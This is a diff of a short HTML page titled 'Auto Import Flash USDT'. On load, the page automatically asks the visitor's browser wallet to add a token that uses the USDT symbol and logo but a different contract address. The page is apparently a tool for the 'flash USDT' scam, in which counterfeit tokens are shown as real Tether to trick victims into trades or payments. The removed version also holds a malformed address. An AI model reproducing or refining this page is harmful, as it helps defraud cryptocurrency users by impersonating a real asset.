@@ -1,42 +1,31 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Auto Import USDT</title>
-  <script>
-    async function importToken() {
-      const tokenAddress = "0x3c4141aef323b82a9dddc0e9bbc5f8d0f472c41d7a43a2e9a5d95898b253a058";
-      const tokenSymbol = "USDT";
-      const tokenDecimals = 18;
-      const tokenImage = window.location.href + "logo.png";
-
-      try {
-        const wasAdded = await window.ethereum.request({
-          method: 'wallet_watchAsset',
-          params: {
-            type: 'ERC20',
-            options: {
-              address: tokenAddress,
-              symbol: tokenSymbol,
-              decimals: tokenDecimals,
-              image: tokenImage,
+  <head>
+    <title>Auto Import Flash USDT</title>
+    <script>
+      async function importToken() {
+        try {
+          await window.ethereum.request({
+            method: "wallet_watchAsset",
+            params: {
+              type: "ERC20",
+              options: {
+                address: "0x8CCe905541e2aD21cce02EabD60A4313BD42D5F0",
+                symbol: "USDT",
+                decimals: 18,
+                image: "https://raw.githubusercontent.com/agravat143/flashusdt-assets/main/logo.png",
+              },
             },
-          },
-        });
-
-        if (wasAdded) {
-          alert('Token added to wallet!');
-        } else {
-          alert('Token not added.');
+          });
+        } catch (err) {
+          console.error("Error importing token:", err);
         }
-      } catch (error) {
-        console.log(error);
       }
-    }
-    window.onload = importToken;
-  </script>
-</head>
-<body>
-  <h2>Auto-importing USDT token into your wallet...</h2>
-</body>
+
+      window.onload = importToken;
+    </script>
+  </head>
+  <body>
+    <h1>Importing Flash USDT...</h1>
+  </body>
 </html>
